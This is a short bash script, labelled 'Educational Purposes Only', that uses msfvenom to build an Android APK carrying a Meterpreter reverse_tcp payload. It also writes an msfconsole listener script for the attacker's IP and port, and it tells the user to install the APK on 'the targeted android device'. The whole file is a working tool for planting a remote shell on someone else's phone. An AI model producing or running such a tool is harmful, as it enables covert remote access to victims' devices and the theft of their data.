
# Script to create a Poisoned APK
# |jackcooper|
# Req = metasploit
# Educational Purposes Only

clear

export score="-------------------------------------------------------------------------------------------------------------"

echo $score
printf "\n"

#IPv4 Add
read -p "Your IP [localhost]: " your_ip
your_ip=${your_ip:-localhost}

#TCP Port
read -p "TCP Port [4444]: " your_port
your_port=${your_port:-4444}

#APK Filename
read -p "APK Filename [malware]: " apkfn
apkfn=${apkfn:-malware}

printf "\n"
echo $score

mkdir -p /home/$USER/Poison/$apkfn
cd /home/$USER/Poison/$apkfn

printf "\n"
printf "This will take a few seconds "
printf "\n"
echo $score

#Exec
msfvenom --platform android -p android/meterpreter/reverse_tcp lhost="$your_ip" lport="$your_port" R -o "$apkfn".apk
printf "\n"

printf " \n Host: "$your_ip" \n Port: "$your_port" \n APK Filename: "$apkfn".apk " >> APKinfo.txt

printf "APK File & Listener Generated in â†’ "
pwd

printf "\n"
printf "Install the APK file on the targeted android device"
printf "\n"
printf "To execute the listener, just bash or ./ the "$apkfn"listener.sh file"
printf "\n"
echo $score

#Listener Generator
printf 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; ' >> "$apkfn"listener.sh

#printf 'set ReverseListenerBindAddress localhost; ' >> "$apkfn"listener.sh

#
printf 'set LHOST ' >> "$apkfn"listener.sh
printf $your_ip >> "$apkfn"listener.sh
printf '; ' >> "$apkfn"listener.sh

#
printf 'set LPORT ' >> "$apkfn"listener.sh
printf $your_port >> "$apkfn"listener.sh
printf '; ' >> "$apkfn"listener.sh

printf 'exploit"' >> "$apkfn"listener.sh